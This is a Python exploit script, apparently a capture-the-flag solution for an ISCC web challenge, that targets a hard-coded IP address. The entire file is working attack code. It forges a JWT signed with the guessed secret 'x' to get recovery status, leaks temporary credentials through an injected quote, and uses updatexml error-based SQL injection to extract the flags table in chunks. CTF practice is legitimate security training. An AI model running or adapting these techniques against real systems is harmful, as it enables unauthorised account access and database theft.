#!/usr/bin/env python3
import base64
import hashlib
import hmac
import json
import re
import sys
import time

import requests

TARGET = "http://39.105.213.28:5001"
KEY = "x"
CHUNK = 16


def b64j(data):
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()


def b64b(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def auth_headers(token):
    return {
        "Authorization": f"Bearer {token}",
        "Cookie": f"token={token}",
        "Connection": "close",
    }


def sign_jwt(uid, uname):
    header = b64j({"alg": "HS256", "typ": "JWT"})
    payload = b64j(
        {
            "uid": uid,
            "username": uname,
            "status": "RECOVERY",
            "exp": 9999999999,
        }
    )
    msg = f"{header}.{payload}"
    sig = b64b(hmac.new(KEY.encode(), msg.encode(), hashlib.sha256).digest())
    return f"{msg}.{sig}"


def req(session, method, url, **kwargs):
    last = None
    for attempt in range(1, 6):
        try:
            return session.request(method, url, timeout=20, **kwargs)
        except requests.RequestException as exc:
            last = exc
            print(f"  [!] {method} {url} try={attempt} failed: {exc}")
            time.sleep(attempt * 2)
    raise RuntimeError(f"request failed: {method} {url} -> {last}")


def get_uid(user, pw):
    sess = requests.Session()
    r = req(
        sess,
        "POST",
        f"{TARGET}/login",
        data={"username": user, "password": pw},
        allow_redirects=False,
        headers={"Connection": "close"},
    )
    if r.status_code != 302:
        return None
    r = req(sess, "GET", f"{TARGET}/dashboard", headers={"Connection": "close"})
    m = re.search(r"<td>\s*(\d+)\s*</td>", r.text)
    return int(m.group(1)) if m else None


def do_recover(token):
    sess = requests.Session()
    r = req(sess, "GET", f"{TARGET}/recovery", headers=auth_headers(token))
    return "temp_" in r.text


def leak_temp_credentials(token):
    sess = requests.Session()
    for i in range(1, 7):
        r = req(
            sess,
            "POST",
            f"{TARGET}/api/v1/user/sync",
            headers={**auth_headers(token), "Content-Type": "application/json"},
            json={"theme": "'", "language": "zh"},
        )
        print(f"  [probe {i}] {r.status_code} {r.text[:200]}")
        m = re.search(r"(temp_[0-9]+_[0-9a-f]{8}).*?([0-9a-f]{32})", r.text, re.I)
        if m:
            return m.group(1), m.group(2)
        time.sleep(i * 2)
    return None, None


def leak_updatexml(token, expr):
    payload = (
        "a' AND updatexml(1,concat(0x7e,"
        f"({expr}),0x7e),1) AND '1'='1"
    )
    sess = requests.Session()
    r = req(
        sess,
        "POST",
        f"{TARGET}/api/v1/user/sync",
        headers={**auth_headers(token), "Content-Type": "application/json"},
        json={"theme": payload, "language": "zh"},
    )
    try:
        err = r.json().get("error", "")
    except Exception:
        err = r.text
    m = re.search(r"~(.*?)~", err)
    return m.group(1) if m else ""


def complete_recovery(token, temp_pass):
    sess = requests.Session()
    r = req(
        sess,
        "POST",
        f"{TARGET}/api/v1/user/sync",
        headers={**auth_headers(token), "Content-Type": "application/json"},
        json={"theme": temp_pass, "language": "zh"},
    )
    print(f"[+] final sync status={r.status_code}")
    print(r.text[:800])
    rr = req(sess, "GET", f"{TARGET}/recovery", headers=auth_headers(token))
    print("\n[+] /recovery after final sync:")
    print(rr.text[:2000])
    for pat in [r"ISCC\{[^}]+\}", r"temp_[0-9]+_[0-9a-f]{8}", r"flag", r"成功", r"恢复"]:
        m = re.search(pat, rr.text, re.I)
        if m:
            print(f"[+] matched: {m.group(0)}")


def test_temp_login(temp_user, temp_pass):
    for base in [TARGET, "http://39.105.213.28:5000"]:
        try:
            sess = requests.Session()
            r = req(
                sess,
                "POST",
                f"{base}/login",
                data={"username": temp_user, "password": temp_pass},
                allow_redirects=False,
                headers={"Connection": "close"},
            )
            print(f"[+] temp login {base}: {r.status_code} {r.headers.get('Location')}")
        except Exception as exc:
            print(f"[-] temp login {base} failed: {exc}")


def main():
    user = "test"
    pw = "test"
    uid = get_uid(user, pw)
    if not uid:
        print("[-] Login fail")
        return 1

    print(f"[+] uid={uid}")
    token = sign_jwt(uid, user)
    print(f"[+] recovery jwt: {token[:60]}...")

    if not do_recover(token):
        print("[-] Recovery fail")
        return 1
    print("[+] recovery OK")

    temp_user, temp_pass = leak_temp_credentials(token)
    if temp_user and temp_pass:
        print(f"[+] temp creds: {temp_user}:{temp_pass}")
        test_temp_login(temp_user, temp_pass)
        complete_recovery(token, temp_pass)
    else:
        print("[-] temp creds not leaked")

    print("\n[+] trying legacy updatexml extraction")
    parts = []
    for i in range(1, 200, CHUNK):
        chunk = leak_updatexml(
            token,
            f"substring((select group_concat(flag) from flags),{i},{CHUNK})",
        )
        if not chunk:
            break
        parts.append(chunk)
        print(f"  [{i}] {chunk}")
        if "}" in chunk:
            break
    flag = "".join(parts)
    m = re.search(r"ISCC\{[^}]+\}", flag)
    if m:
        flag = m.group(0)
    print(f"\nFlag: {flag}")


if __name__ == "__main__":
    sys.exit(main())
